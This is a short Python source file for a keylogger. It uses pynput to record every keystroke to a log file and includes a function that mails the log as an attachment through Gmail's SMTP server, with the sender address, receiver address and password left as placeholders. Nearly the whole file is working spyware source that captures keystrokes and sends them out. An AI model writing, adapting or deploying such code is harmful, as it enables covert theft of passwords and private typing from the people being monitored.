'''
author: Raman-KP
Created: July 19th 2022
'''

#module for keyboard listener so we can record what is typed
from pynput.keyboard import Key, Listener
#module that would allow us to log the keystrokes
import logging

#modules to attach log file to email and send
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def sendEmail(filename, attachment):
    #format email
    frmEmail = "email address of sender"
    toEmail = "email address of reciver"
    
    email = MIMEMultipart()
    email['From'] = frmEmail
    email['To'] = toEmail
    email['Subject'] = "Py-Keylogger Log"
    email.attach(MIMEText("Log file attached.", 'plain'))
    logAttachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((logAttachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment: filename= keylogs.txt")
    email.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(frmEmail, "password of sender")
    text = email.as_string()
    s.sendmail(frmEmail, toEmail, text)
    s.quit()


log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
def write_to_log(key):
    logging.info(str(key))

with Listener(on_press=write_to_log) as listener:
    listener.join()

sendEmail("keylogs.txt", r"path to kelogs.txt")
